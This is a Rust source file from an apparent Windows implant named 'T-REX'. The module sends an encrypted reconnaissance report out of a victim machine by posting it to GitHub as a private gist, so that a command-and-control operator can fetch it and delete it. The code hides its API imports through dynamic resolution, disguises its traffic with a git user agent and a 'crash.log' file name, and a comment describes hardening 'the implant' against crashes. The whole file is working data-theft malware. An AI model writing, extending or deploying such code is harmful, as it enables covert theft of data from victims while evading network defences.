//! T-REX Dead Drop Resolver — GitHub Gist API exfiltration.
//!
//! POSTs encrypted recon report to api.github.com/gists as a private gist.
//! Returns the Gist ID. C2 retrieves via GET /gists/{id}, then DELETE.
//! Full lifecycle <30 seconds. Zero C2 IP/domain exposure.
//!
//! # Pattern: transport.rs WinHTTP

#![cfg(target_os = "windows")]

use core::ffi::c_void;

const WINHTTP_FLAG_SECURE: u32 = 0x0080_0000;
const WINHTTP_ACCESS_TYPE_DEFAULT_PROXY: u32 = 0;

type WinHttpOpenFn =
    unsafe extern "system" fn(*const u16, u32, *const u16, *const u16, u32) -> *mut c_void;

type WinHttpConnectFn = unsafe extern "system" fn(*mut c_void, *const u16, u16, u32) -> *mut c_void;

type WinHttpOpenRequestFn = unsafe extern "system" fn(
    *mut c_void,
    *const u16,
    *const u16,
    *const u16,
    *const u16,
    *const u16,
    u32,
) -> *mut c_void;

type WinHttpAddRequestHeadersFn =
    unsafe extern "system" fn(*mut c_void, *const u16, u32, u32) -> i32;

type WinHttpSendRequestFn =
    unsafe extern "system" fn(*mut c_void, *const u16, u32, *mut c_void, u32, u32, usize) -> i32;

type WinHttpReceiveResponseFn = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;

type WinHttpReadDataFn = unsafe extern "system" fn(*mut c_void, *mut u8, u32, *mut u32) -> i32;

type WinHttpCloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;

struct WinHttpFns {
    open: WinHttpOpenFn,
    connect: WinHttpConnectFn,
    open_request: WinHttpOpenRequestFn,
    add_headers: WinHttpAddRequestHeadersFn,
    send: WinHttpSendRequestFn,
    receive: WinHttpReceiveResponseFn,
    read: WinHttpReadDataFn,
    close: WinHttpCloseHandleFn,
}

unsafe fn resolve_winhttp() -> Option<WinHttpFns> {
    let a = |name: &[u8]| -> Option<usize> { crate::resolve::export_addr(b"winhttp.dll", name) };
    Some(WinHttpFns {
        open: core::mem::transmute(a(b"WinHttpOpen")?),
        connect: core::mem::transmute(a(b"WinHttpConnect")?),
        open_request: core::mem::transmute(a(b"WinHttpOpenRequest")?),
        add_headers: core::mem::transmute(a(b"WinHttpAddRequestHeaders")?),
        send: core::mem::transmute(a(b"WinHttpSendRequest")?),
        receive: core::mem::transmute(a(b"WinHttpReceiveResponse")?),
        read: core::mem::transmute(a(b"WinHttpReadData")?),
        close: core::mem::transmute(a(b"WinHttpCloseHandle")?),
    })
}

fn to_utf16(s: &[u8]) -> crate::heap::Vec<u16> {
    let mut v = crate::heap::Vec::with_capacity(s.len() + 1);
    for &b in s {
        v.push(b as u16);
    }
    v.push(0);
    v
}

/// Base64 encode bytes into a pre-allocated buffer.
/// Returns the number of output bytes written.
fn base64_encode(input: &[u8], output: &mut [u8]) -> usize {
    const TABLE: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut wi = 0usize;
    let ilen = input.len();
    let mut i = 0usize;
    while i < ilen {
        let b0 = input[i] as u32;
        let b1 = if i + 1 < ilen { input[i + 1] as u32 } else { 0 };
        let b2 = if i + 2 < ilen { input[i + 2] as u32 } else { 0 };
        let triple = (b0 << 16) | (b1 << 8) | b2;
        if wi + 4 <= output.len() {
            output[wi] = TABLE[((triple >> 18) & 0x3F) as usize];
            wi += 1;
            output[wi] = TABLE[((triple >> 12) & 0x3F) as usize];
            wi += 1;
            output[wi] = if i + 1 < ilen {
                TABLE[((triple >> 6) & 0x3F) as usize]
            } else {
                b'='
            };
            wi += 1;
            output[wi] = if i + 2 < ilen {
                TABLE[(triple & 0x3F) as usize]
            } else {
                b'='
            };
            wi += 1;
        }
        i += 3;
    }
    wi
}

/// Minimal JSON string extractor: find `"key":"value"` and copy value.
fn json_extract_str(json: &[u8], key: &[u8], out: &mut [u8]) -> bool {
    let klen = key.len();
    let mut i = 0usize;
    while i + klen + 4 < json.len() {
        if json[i] == b'"' && &json[i + 1..i + 1 + klen] == key && json[i + 1 + klen] == b'"' {
            i += klen + 2;
            while i < json.len() && json[i] != b':' {
                i += 1;
            }
            // CRITICAL-20 (2026-07-21 audit): two bugs here.
            //   (a) `i += 1` unconditionally advanced past `:` even if the
            //       `while` above ran off the end (truncated JSON). Bounds-check
            //       first and bail — otherwise the next `json[i]` is OOB.
            //   (b) `i < json.len() && json[i] == b' ' || json[i] == b'"'` —
            //       `&&` binds tighter than `||`, so the right operand
            //       `json[i] == b'"'` evaluated even when `i >= json.len()`,
            //       also OOB. Under panic=abort this kills the implant on any
            //       truncated GitHub response (network blip, 401/403 body).
            //       Add parentheses so the bounds check actually gates both.
            if i >= json.len() {
                return false;
            }
            i += 1; // skip the ':'
            while i < json.len() && (json[i] == b' ' || json[i] == b'"') {
                i += 1;
            }
            let mut o = 0usize;
            while i < json.len() && json[i] != b'"' && o + 1 < out.len() {
                out[o] = json[i];
                o += 1;
                i += 1;
            }
            out[o] = 0;
            return o > 0;
        }
        i += 1;
    }
    false
}

/// Gist upload result.
pub struct GistResult {
    pub gist_id: [u8; 32],
}

/// Upload encrypted payload as a private GitHub Gist.
/// Returns the Gist ID on success.
pub unsafe fn upload_gist(
    pat_token: &str,
    encrypted_payload: &[u8],
) -> Result<GistResult, &'static str> {
    let fns = resolve_winhttp().ok_or("WinHTTP unresolved")?;

    // Base64 encode the payload
    let mut b64_buf = [0u8; 16384];
    let b64_len = base64_encode(encrypted_payload, &mut b64_buf);

    // Build JSON body: {"public":false,"files":{"crash.log":{"content":"<b64>"}}}
    let json_prefix = b"{\"public\":false,\"files\":{\"crash.log\":{\"content\":\"";
    let json_suffix = b"\"}}}";
    let mut body = crate::heap::Vec::with_capacity(json_prefix.len() + b64_len + json_suffix.len());
    body.extend_from_slice(json_prefix);
    body.extend_from_slice(&b64_buf[..b64_len]);
    body.extend_from_slice(json_suffix);

    // WinHTTP session
    let ua = to_utf16(b"git/2.45.0");
    let session = (fns.open)(
        ua.as_ptr(),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        core::ptr::null(),
        core::ptr::null(),
        0,
    );
    if session.is_null() {
        return Err("WinHttpOpen failed");
    }

    let host = to_utf16(b"api.github.com");
    let conn = (fns.connect)(session, host.as_ptr(), 443, 0);
    if conn.is_null() {
        (fns.close)(session);
        return Err("WinHttpConnect failed");
    }

    let path = to_utf16(b"/gists");
    let verb = to_utf16(b"POST");
    let req = (fns.open_request)(
        conn,
        verb.as_ptr(),
        path.as_ptr(),
        core::ptr::null(),
        core::ptr::null(),
        core::ptr::null(),
        WINHTTP_FLAG_SECURE,
    );
    if req.is_null() {
        (fns.close)(conn);
        (fns.close)(session);
        return Err("WinHttpOpenRequest failed");
    }

    // Headers
    let auth = {
        let mut s = to_utf16(b"Authorization: token ");
        for b in pat_token.as_bytes() {
            s.push(*b as u16);
        }
        s.push(0);
        s
    };
    let ct = to_utf16(b"Content-Type: application/json\r\nUser-Agent: git/2.45.0");
    (fns.add_headers)(req, auth.as_ptr(), auth.len() as u32 - 1, 0);
    (fns.add_headers)(req, ct.as_ptr(), ct.len() as u32 - 1, 0);

    // Send
    if (fns.send)(
        req,
        core::ptr::null(),
        0,
        body.as_mut_ptr() as *mut c_void,
        body.len() as u32,
        body.len() as u32,
        0,
    ) == 0
    {
        (fns.close)(req);
        (fns.close)(conn);
        (fns.close)(session);
        return Err("WinHttpSendRequest failed");
    }

    // Receive
    if (fns.receive)(req, core::ptr::null_mut()) == 0 {
        (fns.close)(req);
        (fns.close)(conn);
        (fns.close)(session);
        return Err("WinHttpReceiveResponse failed");
    }

    // Read response
    let mut resp = [0u8; 4096];
    let mut total: u32 = 0;
    loop {
        let mut read: u32 = 0;
        let remain = (resp.len() - total as usize).min(1024) as u32;
        if remain == 0 {
            break;
        }
        if (fns.read)(
            req,
            resp.as_mut_ptr().add(total as usize),
            remain,
            &mut read,
        ) == 0
            || read == 0
        {
            break;
        }
        total += read;
    }

    // Extract gist ID from JSON: "id":"<hex>"
    let mut gist_id = [0u8; 32];
    if !json_extract_str(&resp[..total as usize], b"id", &mut gist_id) {
        (fns.close)(req);
        (fns.close)(conn);
        (fns.close)(session);
        return Err("Gist ID not found in response");
    }

    (fns.close)(req);
    (fns.close)(conn);
    (fns.close)(session);
    Ok(GistResult { gist_id })
}
